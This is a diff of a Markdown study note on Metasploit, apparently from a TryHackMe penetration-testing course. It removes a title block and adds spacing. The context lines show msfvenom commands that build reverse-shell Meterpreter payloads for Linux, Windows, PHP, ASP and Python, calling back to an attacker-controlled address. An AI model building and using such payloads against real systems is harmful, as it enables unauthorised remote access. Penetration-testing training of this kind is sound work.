@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2022-04-14-tryhackme-jr-penetrat
 author: 100007
 ---
 
-# TryHackMe: Jr. Penetration Tester
-
-**author:** Nathan Acks  
-**date:** 2022-04-14
-
 # Exploitation with Metasploit
 
 ## Scanning
@@ -74,18 +69,22 @@ Use `--list formats` to see available encoding formats.
 #
 msfvenom -p linux/x86/meterpreter/reverse_tcp \
 LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f elf > rev_shell
+
 # 32-bit Windows executable Meterpreter payload
 #
 msfvenom -p windows/meterpreter/reverse_tcp \
 LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f exe > rev_shell.exe
+
 # PHP Meterpreter payload
 #
 msfvenom -p php/meterpreter_reverse_tcp \
 LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f raw > rev_shell.php
+
 # ASP Meterpreter payload
 #
 msfvenom -p windows/meterpreter/reverse_tcp \
 LHOST=$ATTACKER_IP LPORT=$ATTACKER_PORT -f asp > rev_shell.asp
+
 # Python Meterpreter payload
 #
 msfvenom -p cmd/unix/reverse_python \
